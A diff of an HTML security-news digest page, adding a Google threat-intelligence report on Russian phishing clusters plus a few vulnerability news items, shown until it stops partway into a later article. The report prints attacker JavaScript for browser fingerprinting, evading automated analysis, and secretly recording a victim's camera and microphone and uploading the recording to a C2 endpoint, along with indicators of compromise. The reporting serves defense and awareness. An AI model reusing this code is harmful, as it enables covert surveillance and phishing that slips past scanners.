@@ -59,12 +59,294 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-08-20</h1>
+        <h1>Security Briefing // 2026-08-21</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Elementor Pro Flaw Could Let Unauthenticated Attackers Upload PHP and Execute Code</button></li><li><button onclick="show('art-1')">Rogue ransomware affiliate poses as recovery firm to steal payments</button></li><li><button onclick="show('art-2')">Microsoft named a Leader in the Frost Radar™: Cloud Workload Protection Platforms, 2026</button></li><li><button onclick="show('art-3')">AWSHound: An OpenSource AWS OpenGraph Collector</button></li><li><button onclick="show('art-4')">Critical RCE flaw in Windows IKE Extension now actively exploited</button></li><li><button onclick="show('art-5')">Attackers Exploit MLflow SSRF Flaw to Steal Cloud Credentials and Secrets</button></li><li><button onclick="show('art-6')">Staying Ahead of Adversarial AI Through Agentic Source Code Review</button></li><li><button onclick="show('art-7')">We've Seen This Movie: The OT/IT Technology Divide</button></li><li><button onclick="show('art-8')">Who’s Tracking You? Use This New Service to Find Out</button></li><li><button onclick="show('art-9')">Microsoft Plugs Nearly 400 Security Holes</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Going with the Flow(s): Distinct Clusters Target Individuals of Interest to Russia</button></li><li><button onclick="show('art-1')">Attackers Exploit Zimbra SNMP Flaw for Unauthenticated Remote Code Execution</button></li><li><button onclick="show('art-2')">Critical Zimbra RCE flaw now actively exploited in attacks</button></li><li><button onclick="show('art-3')">Elementor Pro Flaw Could Let Unauthenticated Attackers Upload PHP and Execute Code</button></li><li><button onclick="show('art-4')">US warns of AI-powered attacks on Siemens PLCs in critical infrastructure</button></li><li><button onclick="show('art-5')">Microsoft named a Leader in the Frost Radar™: Cloud Workload Protection Platforms, 2026</button></li><li><button onclick="show('art-6')">AWSHound: An OpenSource AWS OpenGraph Collector</button></li><li><button onclick="show('art-7')">We've Seen This Movie: The OT/IT Technology Divide</button></li><li><button onclick="show('art-8')">Who’s Tracking You? Use This New Service to Find Out</button></li><li><button onclick="show('art-9')">Microsoft Plugs Nearly 400 Security Holes</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">Going with the Flow(s): Distinct Clusters Target Individuals of Interest to Russia</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/distinct-clusters-target-individuals-of-interest-to-russia/" target="_blank">Original Link</a></p>
+            <div class="content-text">Going with the Flow(s): Distinct Clusters Target Individuals of Interest to Russia
+Google Threat Intelligence Group
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Written by: Gabby Roncone, Wesley Shields
+Overview
+Google Threat Intelligence Group (GTIG) is tracking three distinct suspected Russian cyber espionage threat clusters abusing legitimate authentication flows to target individuals working in academia, aerospace and defense, governments and think tanks across Europe, as well as academia and think tanks within the United States. [Examples](https://cloud.google.com/blog/topics/threat-intelligence/creative-phishing-academics-critics-of-russia) of these techniques can be found in our previous blog on UNC6293’s phishing operations. We now track an additional two distinct suspected Russian clusters, UNC7005 and UNC5976, which conduct phishing, abuse OAuth flows, and/or deploy malware to victims. UNC7005 in particular is tied to the hospitality captive portal redirects reported on by [Reliaquest](https://reliaquest.com/blog/threat-spotlight-dns-poisoning-tactics-expand-to-hospitality/) and [Microsoft](https://www.microsoft.com/en-us/security/blog/2026/07/31/captivecrunch-midnight-blizzard-targets-travelers-worldwide-for-malware-delivery-and-credential-theft/). While each group conducts their campaigns differently, they all ultimately demonstrate a focus on abuse of legitimate authentication workflows to compromise accounts.
+These clusters engage in persistent, adaptive phishing campaigns, using sophisticated social engineering tactics to compromise personal accounts across multiple platforms. Because these operations abuse legitimate authentication flows which may not immediately seem like phishing attempts to users, GTIG is raising awareness about these social engineering campaigns targeting individuals so that targets can more readily recognize malicious outreach.
+UNC6293
+We assess with moderate confidence that UNC6293 is a sub cluster of ICE RELIC (formerly APT29) responsible for initial access operations. UNC6293 operations were [initially reported in June 2025](https://cloud.google.com/blog/topics/threat-intelligence/creative-phishing-academics-critics-of-russia) (also [by Citizen Lab](https://citizenlab.ca/research/russian-government-linked-social-engineering-targets-app-specific-passwords/)) as an aggressive app password phishing campaign against prominent individuals that are critical of Russia. [App passwords](https://support.google.com/mail/answer/185833?hl=en) are passcodes a user can set which gives a less secure app or device permission to access an account. In cases of app password phishing, attackers attempt to convince targets to set specific app passwords on their accounts, which the attackers then use to gain access to those accounts without needing two-factor authentication (2FA). As part of the previously documented UNC6293 campaign, the attacker impersonated the US State Department and attempted to lure targets into setting an app password named ms.state.gov
+. The instructions to do this were in a PDF that contained screenshots of the settings UNC6293 wanted the target to use.
+In the intervening year, UNC6293 has continued to impersonate State Department officials and perform app password phishing. As one example, in October 2025, GTIG observed UNC6293 using a PDF lure document that contained the exact same screenshots as observed in June 2025, including the ms.state.gov
+reference. While in 2025, the attacker requested that the victims share the app password back to them via email, in these newer operations, the attacker asked for it to be entered into an authentication form on an otherwise legitimate looking website.
+Figure 1: Changed text in new lure document
+UNC6293 phishing campaigns tend to be small in scope, usually targeting fewer than five users at a time, and the application names and lures observed by GTIG tend to focus on diplomatic themes and upcoming conferences or meetings, such as those documented in [December 2025 by Volexity](https://www.volexity.com/blog/2025/12/04/dangerous-invitations-russian-threat-actor-spoofs-european-security-events-in-targeted-phishing-attacks/).
+Over time, UNC6293 continued impersonating the U.S State Department while incorporating OAuth phishing into their repertoire. In June 2026, GTIG observed OAuth phishing where UNC6293 requested targets share either the full URL or “verification code” after performing a legitimate login to an external provider. By providing the requested verification code the target would grant UNC6293 access to the account.
+Figure 2: UNC6293 requesting “verification code” on a phishing page, at foreignrelations[.]us
+UNC7005
+UNC7005 (aka STORM-2945) is a threat cluster identified in February 2026 that primarily targets academia, diplomatic, and nonprofit personnel across Ukraine, Western Europe, and the US Although this group shares many high-level similarities with UNC6293, including targeting overlaps, we are tracking it separately due to its lower sophistication and poor operational security, infrastructure with divergent characteristics, and incorporation of malware. Similarly we assess with moderate confidence that UNC7005 is another initial access cluster connected to ICE RELIC.
+App Password Phishing
+Since at least February 2026, UNC7005 has conducted highly selective app password phishing operations targeting individuals of interest to the Russian state. These operations use similar social engineering tactics to UNC6293, but differ in that the app passwords used appear to be unique per target in all observed cases except one. They are specific to the theme used when social engineering the target, such as referencing the type of activity the target is supposedly engaging in (i.e. secure file sharing) and/or the organization UNC7005 is masquerading as.
+Figure 3: Social engineering landing page used in a UNC7005 operation
+Device Code Phishing
+UNC7005 also conducts device code phishing operations for both Microsoft and WhatsApp accounts. The themes of these phishing waves often involve invitations for calls with individuals from notable organizations related to the target’s field or, most recently, invitations to diplomatic events and conferences.
+Microsoft Device Code Phishing
+UNC7005 initially delivers Microsoft device code phishing attempts via email, which are sometimes sent from the attacker-controlled domains they create to masquerade as legitimate events and organizations. The emails contain links to these attacker websites which often use similar templates. For example, UNC7005 initially re-used the website template from a previous “embassy invite” themed operation in late April 2026 in a different operation spoofing the legitimate GLOBSEC forum in May 2026.
+Figure 4: Landing page spoofing GLOBSEC
+Upon accessing the webpage, the target’s system is fingerprinted, likely to check for an automated scanner accessing the page.
+(function(){
+var fp = {
+tid: "3311a310cd4f40d4",
+sw: screen.width,
+sh: screen.height,
+tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+lang: navigator.language,
+plat: navigator.platform,
+cores: navigator.hardwareConcurrency || null,
+mem: navigator.deviceMemory || null,
+touch: navigator.maxTouchPoints || 0,
+};
+fetch('/fingerprint', {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify(fp),
+keepalive: true,
+}).catch(function(){});
+Figure 5: Initial system fingerprint for analysis evasion
+The target is prompted to confirm their attendance to the conference and register. The registration process is thorough, and notably contains an epicurean wine selection, which was a theme in multiple [previous ICE RELIC-linked phishing campaigns](https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving-diplomatic-phishing).
+Figure 6: Registration form before “verification” via device code
+Figure 7: Epicurean wine selection
+Upon filling out the form, the target is once again prompted to submit their identity verification. Notably, in the GLOBSEC example, the text refers to “Embassy security policy” rather than GLOBSEC - an artifact from a previous operation.
+Figure 8: “Identity Verification” prompt after registration
+Figure 9: GLOBSEC lure displaying device code after registration
+Within days of identifying this activity, we observed the actor actively make changes to the operation. Citing technical difficulties in the page text, UNC7005 revised the template they used for social engineering, modifying the questions asked to the target as well as the color scheme (5b8d50c2e8cc3038b7c6e6dbf1219f6e814930a1e3c0053143a1191ae67f8ffc
+).
+Figure 10: GLOBSEC re-do
+This time, UNC7005 included a script in the main registration page to attempt to detect and evade automated analysis efforts.
+(function(){
+var h = false;
+try {
+// webdriver flag â set by ChromeDriver, Puppeteer, Selenium
+if (navigator.webdriver) h = true;
+// Headless Chrome has no plugins at all
+// Headless Chrome / PhantomJS often have no languages
+if (!h && (!navigator.languages || navigator.languages.length === 0)) h = true;
+// Chrome-specific runtime object absent in headless older builds
+if (!h && typeof window.chrome === 'undefined' &&
+/chrome/i.test(navigator.userAgent)) h = true;
+// Permission query behaves differently in headless
+if (!h && navigator.permissions) {
+navigator.permissions.query({name:'notifications'}).then(function(r){
+if (r.state === 'denied' && Notification.permission === 'default') {
+document.documentElement.innerHTML = '';
+window.stop();
+}
+}).catch(function(){});
+}
+} catch(e) { h = true; }
+if (h) { document.documentElement.innerHTML = ''; window.stop(); }
+})();
+Figure 11: Second system fingerprint for analysis evasion
+WhatsApp Device Linking (and More)
+In May and June 2026, UNC7005 conducted social engineering operations spoofing WhatsApp. The phishing pages distributed by the attacker lure targets into linking their WhatsApp accounts with an attacker controlled device in order to join a secure WhatsApp call, chat, or document share. The attacker also attempts multiple other methods of compromise after the device is linked.
+Figure 12: WhatsApp compromise flow
+Upon accessing the page, the target is prompted to provide a phone number. The phone number is used to create a legitimate WhatsApp device link request with the attacker device, and then displays the legitimate QR and linking code to the target alongside instructions to the user to link their device.
+Figure 13: Malicious landing page for WhatsApp device linking
+After the target successfully links their account to the attacker's WhatsApp device, the phishing page displays an additional prompt to the user to either join a voice call, encrypted chat, or download a file.
+Figure 14: Post-Compromise “Voice Call”
+If the target joins the voice call, malicious JavaScript to record target audio and video is triggered. The webpage presents a fake voice call with a ring for a limited amount of time while the audio and video are recorded. The recording would then be sent to the attacker command-and-control (C2) endpoint /api/code/<unique user session id>/recording
+when the call “fails”.
+function startMediaRecording() {
+if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+return Promise.resolve();
+}
+return navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+.then(function(stream) {
+mediaStream = stream;
+var selfVideo = document.getElementById('self-video');
+var selfView = document.getElementById('self-view');
+if (selfVideo && selfView) {
+selfVideo.srcObject = stream;
+selfView.style.display = '';
+}
+recordedChunks = [];
+var options = { mimeType: 'video/webm;codecs=vp8,opus' };
+if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+options = { mimeType: 'video/webm' };
+if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+options = {};
+}
+}
+mediaRecorder = new MediaRecorder(stream, options);
+mediaRecorder.ondataavailable = function(e) {
+if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+};
+mediaRecorder.start(1000);
+})
+.catch(function() {
+});
+}
+[...]
+function uploadRecording() {
+if (mediaStream) {
+mediaStream.getTracks().forEach(function(t) { t.stop(); });
+mediaStream = null;
+}
+if (!recordedChunks.length) return;
+var blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/webm' });
+recordedChunks = [];
+var formData = new FormData();
+formData.append('recording', blob, 'recording_' + sessionId + '.webm');
+fetch('/api/code/' + sessionId + '/recording', { method: 'POST', body: formData })
+.then(function(r) { if (!r.ok) throw new Error('Upload failed'); })
+.catch(function() {
+return fetch('/api/code/' + sessionId + '/recording', { method: 'POST', body: formData });
+})
+.then(function(r) { if (r && !r.ok) throw new Error('Upload failed'); })
+.catch(function() {});
+}
+Figure 15: Malicious JavaScript to record audio and visual of target and upload to C2
+The phishing page may also present the target with a fake “encrypted chat” option after successful device linking. The JavaScript first renders chat credentials and an additional login URL with uniform resource identifier (URI) /chat/login
+. It prompts the user to copy the username and password presented to them to log in on the secondary URL.
+If the target was presented with a file transfer lure and successfully linked their WhatsApp account, the web page renders a file download button. GTIG is unable to assess what file may have been staged for download at this time.
+Browser Stealers & Malware-as-a-Service (MaaS)
+In late May 2026, UNC7005 conducted a much broader phishing wave than any we had previously observed. This operation targeted prominent, mostly US based academics, diplomats, and researchers focused on Russia and former Soviet states. The email address used by the attacker in this operation was almost identical to one used in a UNC6293 operation in June 2025.
+In this operation, UNC7005 distributed malicious URLs through phishing emails. If the target browsed to the URL from a Windows or macOS device, it directed targets to a landing page spoofing a “summit” related to a resolution to support Ukraine. If not, it displayed an error to the user and requested that they switch to another OS for compatibility.
+Figure 16: Landing page prompting targets to download malware
+The website was more elaborately built to social engineer the target, containing information about the various parts of the resolution and even contained contact information for the threat actor for questions or technical difficulties.
+If the target clicked the button to download a “Summit Companion App” to read the full resolution on Ukraine, they were served infostealer malware based on the OS indicated in the target’s User Agent.
+Windows option
+If the User Agent indicates that the target is browsing from a machine running Windows, the malicious webpage serves a sample of VIDAR to the target (1d9299799a7b8da67c44ebec064d64542c27645f8e84de4a22ca3f6cbc843e3c
+). This sample is an obfuscated Go binary with a C2 of 107.189.18[.]7
+. VIDAR is an infostealer operated as a Malware as a Service (MaaS) which primarily targets sensitive information stored in browsers, such as credentials, stored payment information, cookie information, and saved addresses, which it then sends to the C2 in plaintext.
+Mac option
+If the User Agent indicates that the target is browsing from a machine running macOS, the malicious webpage served a sample of ATOMIC to the target (c5826032207d623a7f6caec8465af7364eccc355f9a48897da2a54f3e4420265
+). ATOMIC (aka AtomicStealer) is a macOS infostealer operated as a MaaS and also targets sensitive browser information.
+OAuth Phishing
+Cloud Projects
+In early August 2026, UNC7005 began Google account OAuth phishing operations using cloud infrastructure. Beginning on July 31, 2026, UNC7005 registered domains spoofing the legitimate [Finnish Operations Center (FOC)](https://fi.linkedin.com/company/focfi), which supports Finnish companies in the defense and security markets, specifically in the context of the North Atlantic Treaty Organization (NATO). Between August 6 and August 13, 2026, UNC7005 sent targeted phishing emails linking to an attacker-controlled domain to targets in or related to the European defense industry.
+Figure 17: Landing page spoofing Finnish Operations Center, prompting target to sign in and gain access to a resource
+Upon clicking “Get Access” or “Sign in With Google”, the target is redirected to a legitimate Google OAuth login page which prompts the target to sign in to their account to continue. If the target authenticates, they are redirected to an attacker-controlled, testing mode, unverified cloud project which is likely used to steal authentication tokens that grant the attacker access to the target account.
+Figure 18: Google OAuth login before redirect to attacker-controlled cloud project
+Other OAuth Phishing
+In early August 2026, GTIG identified a highly targeted phishing operation in which UNC7005 sent legitimate Microsoft OAuth URLs directly to targets. The attacker email used in this operation was also used in the cloud project OAuth phishing operations.
+UNC7005 and the Hospitality Captive Portal Campaign
+In late April 2026, GTIG began tracking UNC7005 infrastructure mimicking Microsoft authentication resources. As each domain appeared to be operationalized by the threat actor, GTIG took actions to add that infrastructure to the [Safe Browsing](https://safebrowsing.google.com/) blocklist. Consistent with public reporting, in mid-July 2026, GTIG began observing users redirected to this attacker infrastructure from captive portals associated with hotels and conference centers. On July 23, 2026, Reliaquest published a [blog](https://reliaquest.com/blog/threat-spotlight-dns-poisoning-tactics-expand-to-hospitality/) analyzing domain name system (DNS) requests showing captive portal redirects to attacker-controlled login pages spoofing Microsoft authentication resources. Later, on July 31, 2026, [Microsoft detailed Midnight Blizzard activity](https://www.microsoft.com/en-us/security/blog/2026/07/31/captivecrunch-midnight-blizzard-targets-travelers-worldwide-for-malware-delivery-and-credential-theft/) leveraging captive portals on hospitality sector networks to serve malware or gain access to Microsoft accounts via device code phishing.
+For the duration of its lifetime, the set of infrastructure used in the captive portal campaign appeared to be used in multiple ways by the threat actor. GTIG linked this infrastructure directly to the other authentication-focused and malware operations conducted by UNC7005 dating back to April 2026.
+Figure 19. Connections between captive portal campaign and other UNC7005 activity
+A domain linked to the hospitality captive portal domain shares an Internet Protocol (IP) resolution with an UNC7005 domain used in an earlier device code phishing operation.
+-
+Between July 16 and July 23, 2026, UNC7005 registered three Microsoft Outlook Web Access (OWA) themed domains (
+owa-ms365[.]com
+,m365-owa[.]com
+, andms365-device[.]com
+), which were later linked to the hospitality captive portal campaign, using the emailchikolimdrid@gmail.com
+. -
+That attacker email was previously used to register an earlier domain masquerading as Microsoft,
+ms365-live.com
+which resolved to IP104.194.159[.]150
+. -
+In April 2026, a domain used in the GLOBSEC-themed Microsoft device code phishing operation previously discussed in this blog,
+my-invite[.]org
+, resolved to IP104.194.159[.]150
+.
+The actor also used additional domains spoofing Microsoft services in other operations. An earlier attacker-controlled domain spoofing Microsoft in late April 2026 (statistic-ms[.]live
+) was used by UNC7005 as C2 for Go malware we call ENGINELIGHT. This malware was sent in a limited phishing operation in early May 2026 from the attacker-controlled account bounce@chamber-ua.org
+, along with a domain spoofing WhatsApp (wa-connect[.]eu
+). Additionally, the attacker email used to register statistic-ms[.]live
+(keyereaonkendrick4@gmail.com
+) was used in the previously documented MaaS operation in late May 2026.
+We have also observed tooling overlaps between campaigns conducted by UNC7005 and the tools reported to have been deployed in the captive portal operation. Samples of the CHERRYPIE PowerShell infostealer (also known as ChocoShell) contain numerous artifacts suggesting the malware is generated by a large language model (LLM). The prolific function comments mention an infostealer and specific function offsets noting functionality are located in the binary. Given GTIG’s observation of this threat actor leveraging MaaS in operations and functional overlaps between the malware families, such as consistency in types of data targeted by the malware, we suspect CHERRYPIE may be based on an infostealer purchased from MaaS operators.
+UNC5976
+GTIG began tracking OAuth related activity from UNC5976, a suspected Russian cyber espionage cluster with an authentication focus, in March 2026. We believe this cluster to be distinct from UNC6293 and UNC7005.
+One of the main themes of UNC5976 operations was the use of OAuth phishing techniques and automation of token collection via abuse of cloud infrastructure. To perform these OAuth phishing campaigns, UNC5976 purchased domains, usually using file sharing related domain names, and then created a cloud project related to that domain. These domains host a fake file sharing page. After a target visits the page for a few seconds, the page displays a pop up login dialog.
+Figure 20: Fake file sharing page
+If the target clicks the “Continue with Google” link they are taken to a legitimate Google OAuth login page, asking the target to sign in to continue:
+Figure 21: OAuth login page from verify-drive[.]com
+After authenticating, the target was redirected to a Google Cloud project URL. The cloud project hosted malicious scripts that retrieve the authentication token from the URL and save it for the operator to later retrieve.
+Within approximately three months of initial discovery and disruption by GTIG, UNC5976 created at least twelve new domains and related infrastructure. In response, GTIG took steps to disable these cloud projects and disrupt these phishing activities. GTIG now assesses that UNC5976 is migrating away from Google infrastructure to other providers to host part of their phishing infrastructure.
+In addition to these phishing pages, we have also observed UNC5976 leverage a malicious Excel plugin, which we named HEADRUSH. In April 2026, GTIG observed a HEADRUSH sample (2c7f4165967d6f7737b3fef87959846920b57a5368b531ad1427c7214d4c41a2
+) that ultimately led to an HTML Application (HTA) downloader. UNC5976 distributed this malware using a domain that impersonated a research institute in Ukraine and may have targeted a Ukrainian aerospace and imaging company. Unfortunately, GTIG was unable to determine the full extent of the infection chain at the time.
+Attribution
+GTIG assesses with high confidence that these three threat clusters - UNC6293, UNC7005, and UNC5976 - possess a Russian nexus, based on high-level targeting patterns, phishing themes, and shared operational techniques. While these operations often appear unique on the surface, several high-level TTPs used by UNC6293 and UNC7005 harken back to older, attributed ICE RELIC phishing operations between 2021 and 2024.
+ICE RELIC, UNC6293, AND UNC7005
+GTIG assesses with moderate confidence that UNC6293 and UNC7005 are related to a subcluster of ICE RELIC that we associate with initial access operations. As such, UNC6293 and UNC7005 share operational methodologies but operate different infrastructure and tolerate different thresholds of OPSEC.
+-
+There is significant overlap in target industries (academia, NGOs, diplomacy, and defense) and geographic regions between historical ICE RELIC phishing operations and current UNC6293 and UNC7005 campaigns.
+-
+These groups continue to use specific legacy themes, such as diplomatic event invitations and specific references to wine, which have previously been documented in ICE RELIC activity.
+-
+All clusters heavily rely on commercial residential proxies for post-compromise activity.
+Distinct, but noteworthy: UNC5976
+UNC5976 remains distinct from the UNC6293 and UNC7005 clusters, potentially reflecting differing strategic mandates and potential alignment with alternative Russian intelligence services.
+-
+Its operational focus is primarily centered on the military, aerospace, defense industrial base, and NGOs/think tanks. Much of the group’s geographic targeting has centered on Ukraine and Armenia.
+-
+UNC5976 uses dedicated infrastructure for post-compromise activity rather than residential proxies.
+-
+UNC5976 has a much heavier malware and tooling footprint than the ICE RELIC-linked clusters, despite also conducting OAuth operations.
+Remediation and Hardening
+At Google, we prioritize user safety. Google will actively disable known actor accounts and where possible, secure victims to remove access to known compromised accounts. We have taken action against infrastructure used to host malicious content in these operations. We strongly recommend users to not proceed past warnings for suspicious websites. Check the URL in your browser before entering credentials or authenticating to any website. Always contact official organizers directly using contact details found outside of the invitation to confirm the legitimacy of any invitation from an unknown contact. Although outreach over email or messenger applications may come from someone who appears to be a legitimate person, please consider the possibility that the persona may be spoofed.
+App passwords are not recommended and unnecessary in most cases. App passwords are not tools for account or identity verification. Do not share an app password with anyone else. We recommend revoking any legacy app passwords tied to devices that are lost, stolen, or no longer in use. If you believe you may have set an app password related to this campaign, follow [instructions](https://support.google.com/accounts/answer/185833?hl=en#zippy=%2Cremove-app-passwords) to remove app passwords from your account as soon as possible. App passwords can be removed at any time.
+In specific scenarios, to protect users from deceptive apps, we display a [warning “unverified app” screen](https://support.google.com/google-ads/answer/7454865?hl=en) before showing users the OAuth consent screen for authentication for unverified, testing mode cloud projects with permissions scopes considered sensitive.
+High-risk users should consider Google’s enhanced security resources such as the [Advanced Protection Program](https://landing.google.com/intl/en_in/advancedprotection/) (APP). Participation in the APP prevents accounts from creating app passwords due to higher security requirements. Enterprise customers of Google Cloud can disable App Specific Passwords by restricting [2-Step verification to “Only Security Keys”](https://knowledge.workspace.google.com/admin/security/protect-your-business-with-2-step-verification) or enrolling users into the [Advanced Protection Program](https://knowledge.workspace.google.com/admin/security/enable-user-enrollment-in-the-advanced-protection-program#enable).
+Threat actors are continually targeting victim’s personal messaging applications and performing device linking attacks. Organizations and high risk individuals relying on these applications should continue to harden defences by:
+-
+Enforcing registration locks and two factor authentication where possible to prevent an adversary from registering an account via stolen SMS verification codes
+-
+Establish routine device audit checks for “linked devices” on both corporate and personal devices
+-
+Leverage Safety numbers/codes to validate users via off platform communication channels
+Outlook and Implications
+These clusters of Russia’s authentication-focused cyber espionage operations target multiple types of authentication using legitimate features and infrastructure, ranging from app passwords to device linking. In particular, their creative abuse of legitimate features to compromise accounts makes tracking legitimate and malicious account access more challenging. The accounts these groups target are often personal, rather than corporate domain-joined accounts, creating a visibility gap for monitoring compromise from an organizational perspective. The likely use of encrypted messenger applications instead of email for initial outreach also presents a challenge to defenders hoping to track and remediate abuse. The combination of these tactics not only enables the attacker to conduct quick-turnaround exfiltration operations, but also presents opportunities for the attacker to further phish targets of interest from compromised, legitimate accounts.
+The tactics adopted by these actors obfuscate threat actor activity and make attribution more challenging. Although GTIG now tracks more UNC6293-controlled infrastructure than we did in our previous analysis, the volume of infrastructure that they use is still limited in comparison to other Russian espionage operations. UNC7005’s use of MaaS and LLMs to enable malware operations further pushes these operations into attribution and remediation gray areas. These choices also lessen the time needed to develop and stage tooling for operations, enabling fast-turnaround operations with bespoke tools.
+As a result of these changes in modus operandi by Russian-state backed attackers, individuals working in the target verticals of these clusters must remain wary of any outreach by unverified, though seemingly familiar or legitimate, personas or organizations.
+Acknowledgements
+We would like to thank partners across the industry for their collaboration in helping to track and disrupt parts of these operations, including but not limited to our partners at Anthropic, Black Lotus Labs at Lumen Technologies, Microsoft Threat Intelligence Center (MSTIC), and the Polish Military Counterintelligence Service (SKW) and WhatsApp.
+Indicators of Compromise (IOCs)
+To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users.
+Network Indicators
+Table 1: Network Indicators
+File Indicators
+Table 2: File Indicators
+Google Security Operations (SecOps)
+Google Security Operations customers with the Enterprise Plus license have access to these rules under the Applied Threat Intelligence - Curated Prioritization rule pack. The activity discussed in the blog post can be detected under the Applied Threat Intelligence (ATI) alerts. These alerts are IoC matches that have been contextualized by YARA-L rules using curated detection. The contextualization leverages Google threat intelligence from Google SecOps context entities, which allows intelligence-driven alert prioritization.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">Attackers Exploit Zimbra SNMP Flaw for Unauthenticated Remote Code Execution</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/08/attackers-exploit-zimbra-snmp-flaw-for.html" target="_blank">Original Link</a></p>
+            <div class="content-text">A now-patched security flaw impacting Zimbra Collaboration (ZCS) has come under active exploitation in the wild, according to the Polish Computer Emergency Response Team (CERT Polska).
+The vulnerability in question is [CVE-2026-73570](https://nvd.nist.gov/vuln/detail/CVE-2026-73570) (CVSS score: 8.9), which refers to a case of command injection that can lead to remote code execution.
+"A remote code execution vulnerability exists in Zimbra Collaboration (ZCS) before 10.1.20 when the optional zimbra-snmp package is installed, and SNMP notifications are enabled," according to a description of the flaw in the NIST National Vulnerability Database (NVD).
+"Due to improper sanitization of untrusted input during SNMP notification processing, an unauthenticated attacker can send specially crafted SMTP requests that may result in execution of arbitrary operating system commands as the Zimbra user."
+The security issue was [patched](https://thehackernews.com/2026/07/zimbra-patches-critical-snmp-command.html) by Zimbra last month with the release of version 10.1.20.
+In a bulletin [issued](https://moje.cert.pl/komunikaty/2026/145/aktywnie-wykorzystywana-podatnosc-w-zimbra-collaboration-suite/) earlier this week, CERT Polska alerted of active exploitation efforts targeting the flaw, urging users to check the "/var/log/zimbra.log" file for suspicious Zimbra service restarts, as well as for files created in the below directories within the last 30 days -
+- /opt/zimbra/jetty/webapps/
+- /opt/zimbra/jetty_base/webapps/
+- /tmp/
+Vulnerabilities in Zimbra have been frequently targeted by threat actors. Last month, the U.S. government [disclosed](https://thehackernews.com/2026/07/fake-notepad-plugin-delivers.html) details of a phishing campaign orchestrated by a Russia-linked adversary called Laundry Bear (aka CL-STA-1114, TA488, UNK_PitStop, and Void Blizzard) that involved targeting Zimbra mail servers belonging to Western government and commercial organizations since at least July 2025.
+The campaign was found to have weaponized CVE-2025-66376, a stored cross-site scripting vulnerability in Zimbra's Classic UI, to deliver a malicious JavaScript payload dubbed ZimReaper to harvest email communications and other sensitive data.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">Critical Zimbra RCE flaw now actively exploited in attacks</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/critical-zimbra-rce-flaw-now-actively-exploited-in-attacks/" target="_blank">Original Link</a></p>
+            <div class="content-text">CERT Polska, the Polish Computer Emergency Response Team (CERT), warned that attackers have begun exploiting a critical vulnerability in Zimbra Collaboration Suite (ZCS). [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
             <h2 class="article-title">Elementor Pro Flaw Could Let Unauthenticated Attackers Upload PHP and Execute Code</h2>
             <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/08/elementor-pro-flaw-could-let.html" target="_blank">Original Link</a></p>
             <div class="content-text">Cybersecurity researchers have disclosed details of a critical flaw in the Elementor Pro WordPress plugin that, if successfully exploited, could lead to remote code execution.
@@ -89,17 +371,17 @@ WordPress users are [advised](https://blog.sucuri.net/2024/09/how-do-website-own
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-1" class="article-body">
-            <h2 class="article-title">Rogue ransomware affiliate poses as recovery firm to steal payments</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/rogue-ransomware-affiliate-ransom-busters-poses-as-recovery-firm/" target="_blank">Original Link</a></p>
-            <div class="content-text">A suspected ransomware affiliate is posing as a ransomware recovery service called "Ransom Busters," contacting the victims before the attacks become public and claiming to be able to provide decryption keys and delete stolen data for a fee. [...]
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">US warns of AI-powered attacks on Siemens PLCs in critical infrastructure</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/us-warns-of-ai-powered-attacks-on-siemens-plcs-in-critical-infrastructure/" target="_blank">Original Link</a></p>
+            <div class="content-text">U.S. cybersecurity agencies warn that threat actors are using AI-generated scripts to exploit Siemens S7 Series programmable logic controllers (PLCs) in U.S. critical infrastructure. [...]
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-2" class="article-body">
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Microsoft named a Leader in the Frost Radar™: Cloud Workload Protection Platforms, 2026</h2>
             <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/08/19/microsoft-named-a-leader-in-the-frost-radar-cloud-workload-protection-platforms-2026/" target="_blank">Original Link</a></p>
